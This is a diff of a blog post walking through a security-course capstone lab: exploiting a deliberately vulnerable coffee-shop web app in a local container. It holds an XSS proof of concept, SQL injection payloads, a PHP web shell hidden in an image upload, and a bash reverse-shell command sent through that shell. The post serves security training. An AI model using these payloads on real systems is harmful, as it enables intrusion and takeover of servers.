@@ -1,13 +1,14 @@
 --- 
-title: "Web App Exploit Project [TCM-Security CEH Capstone]"
+title: "Simple Web App Exploit [TCM-Security PEH Capstone]"
+description: "This is a straightforward web application exploit where we will leverage basic web app exploits"
 date: 2024-06-25 12:00:00 -100
 image: /assets/images/Coffe Shop/PEH.png
 categories: [CTF, pentest]
-tags: [xss, penetration testing]    # TAG names should always be lowercase
+tags: [xss,sql injection,burpsuite]    # TAG names should always be lowercase
 ---
 Cover image by [Freepik](https://www.freepik.com/)
 
-_This is a straightforward web application exploit where we will leverage vulnerabilities in a poorly designed website. The goal is to find exploits avaialbe and if possible gain shell access to the device hosting the application. The web application lives in a container located on our local machine. As the title says, this is the capstone for TCM-Securities Practical Ethical Hacking course_
+_Here we will leverage vulnerabilities in a poorly designed website. The web application lives in a container located on our local machine. As the title says, this is the capstone for TCM-Securities Practical Ethical Hacking course_
 
 
 Navigating to our localhost/capstone We see the following webpage. 
@@ -15,7 +16,7 @@ Navigating to our localhost/capstone We see the following webpage.
 ![Image of the website](/assets/images/Coffe%20Shop/Website%20Pic.png)
 _Coffee store application_
 
-I clicked on one of the available items listed and it allows us to enter a comment. To which I tried a very basic XSS POC
+Clicking on one of the available items listed allows us to enter a comment. Let's try a basic XSS test
 
 ```javascript
 <script>alert(1)</script>
@@ -23,27 +24,29 @@ I clicked on one of the available items listed and it allows us to enter a comme
 
 ![XSS](/assets/images/Coffe%20Shop/Coffe%20XSS%20example.png)
 
-Great, our first finding is the XSS vulnerability. I also noticed the URL is also may be vulnerable to SQL injection attacks as it directly reflects what's in the URL
+Great, our first finding is the XSS vulnerability. I also noticed the URL is also may be vulnerable to XSS attacks as it directly reflects what's in the URL
 
 ![XSS2](/assets/images/Coffe%20Shop/URL%20Reflected%20back%20at%20us.png)
 
 {% include tip.html content="Input sanitization & encoding user input can help prevent this types of attacks." %}
 
-Manipulating the URL with a simple sql injection statement allows me to retreive all the coffees from the database
+let's try manipulating the URL with a simple sql injection statement
 
 ```sql
 coffee.php?coffee=1' or 1=1-- -
 ```
 
+This SQL injection allows us to retrieve all the items from the database
+
 Since 1=1 equates to true we get all the available items. The comment delimiter -- - means that anything after it will be treated as comment and thus ignored
 
 ![Simple SQL exploit](/assets/images/Coffe%20Shop/XSS%20Injection%202.png)
 
-Great, so with this POC working, we can try to extract the number of columns we're dealing with. Glancing at the image below, there's probably 7 columns
+Great, so with this POC working, we can try to extract the number of columns we're dealing with. Glancing at the image below, there's probably `7` columns
 
 ![Number of Columns](/assets/images/Coffe%20Shop/Number%20of%20columns.png)
 
-Extracting the number of columns using the following line
+We can extract the number of columns using the following line
 
 ```sql
 coffee=1' union select null,null,null,null,null,null,null-- -
@@ -71,7 +74,7 @@ Scrolling down, we see the non standard SQL tables that are probably related to 
 Let's enumerate the columns as well
 
 ```SQL
-coffee=1'union select COLUMN_NAME,COLUMN_NAME,COLUMN_NAME,COLUMN_NAME,COLUMN_NAME,COLUMN_NAME,COLUMN_NAME%20FROM%20INFORMATION_SCHEMA.COLUMNS-- -
+coffee=1'union select COLUMN_NAME,COLUMN_NAME,COLUMN_NAME,COLUMN_NAME,COLUMN_NAME,COLUMN_NAME,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS-- -
 ```
 
 Important columns obtained 👌
@@ -163,11 +166,11 @@ It looks like we can successfully upload. We'll use the inspector in the browser
 
 ![Image source](/assets/images/Coffe%20Shop/image%20location.png)
 
-From here we will edit the request in brupsuite to include 
+Looks like the image source is `assets/<assetnumber>` From here we will edit the request in Brupsuite to include a php command injection one liner
 
 ![File named changed](/assets/images/Coffe%20Shop/File%20name%20changed.png)
 
-As you can see from the picture above we had to change the file name to a .php file so that it would execute our php shell. We added the php reverse one liner that take the parameter from the URL and executes it as a system command on the server. We also had to remove most of the image data below the [magic byte](https://en.wikipedia.org/wiki/List_of_file_signatures) `PNG`
+As you can see from the picture above we had to change the file name to a `.php` file so that it would execute our php shell. We added the php reverse one liner that take the parameter from the URL and executes it as a system command on the server. We also had to remove most of the image data below the [magic byte](https://en.wikipedia.org/wiki/List_of_file_signatures) `PNG` to avoid any errors in processing the request
 
 ```bash
 <?php system($_GET['cmd']); ?>
@@ -198,4 +201,8 @@ http://localhost/capstone/assets/21.php?cmd=/bin/bash%20-c%20%27bash%20-i%20%3E%
 
 ![Reverse Shell Obtained](/assets/images/Coffe%20Shop/Shell%20obtained.png)
 
-And GG, we have successfully compromsied this container. It's crucial to avoid security vulnerabilites like XSS attacks. The URL & comment section appeared to lack any [input validation](https://www.sciencedirect.com/topics/computer-science/input-validation#:~:text=Input%20validation%20is%20the%20process,standard%20defined%20within%20the%20application.) and should valid the type of input being entered to ensure safe characters. 
+And GG, we have successfully compromsied this container. It's crucial to avoid security vulnerabilites like XSS attacks. The URL & comment section appeared to lack any [input validation](https://www.sciencedirect.com/topics/computer-science/input-validation#:~:text=Input%20validation%20is%20the%20process,standard%20defined%20within%20the%20application.) and should valid the type of input being entered to ensure safe 
+
+# Vulnerability Assessment Report (Not Finished)
+
+<iframe src="/assets/images/Coffe Shop/Coffee Co - Web Application Vulnerability Assessment.pdf#toolbar=0" width="100%" height="600px"></iframe>
